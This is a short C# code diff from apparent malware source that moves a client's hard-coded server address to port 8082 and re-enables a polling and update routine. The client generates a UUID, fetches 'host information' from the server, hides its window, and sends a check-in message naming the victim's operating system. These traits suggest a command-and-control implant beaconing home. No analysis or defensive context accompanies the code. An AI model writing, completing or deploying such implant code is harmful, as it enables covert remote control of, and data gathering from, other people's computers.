@@ -19,9 +19,7 @@ namespace cevsn
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
 
-        public static int FILEPORT = 8000;
-
-        public static String URL = "http://192.168.62.131:"+FILEPORT+"/initial.txt";
+        public static String URL = "http://192.168.62.131:8082/initialRSA.txt";
         public static String UUID = Guid.NewGuid().ToString();
         public volatile static byte[] iv = new byte[16];
         public volatile static string Key = "";
@@ -65,11 +63,11 @@ namespace cevsn
                 {
                     while(gotHostInformation == false)
                     {
-                        URL = "http://192.168.62.131:"+FILEPORT+"/"+UUID+".txt";
+                        URL = "http://192.168.62.131:8082/"+UUID+".txt";
                         cont = getContent();
                         if(cont == "")
                         {
-                            URL = "http://192.168.62.131:"+FILEPORT+"/initial.txt";
+                            URL = "http://192.168.62.131:8082/initialRSA.txt";
                             Update();
                         } else {
                             parseHostInformation(cont);
@@ -109,9 +107,8 @@ namespace cevsn
                                         {
                                             Console.Write("Sending to Server first Conn!\n");
                                             tevsn.Send(UUID + ": just arrived to vacation on: " + osName);
-                                            //URL = "http://"+IP+":"+FILEPORT+"/"+UUID+".txt";
-                                            //Thread.Sleep(5000);
-                                            /*
+                                            URL = "http://"+IP+":8082/"+UUID+".txt";
+                                            Thread.Sleep(5000);
                                             try
                                             {
                                                 Update();
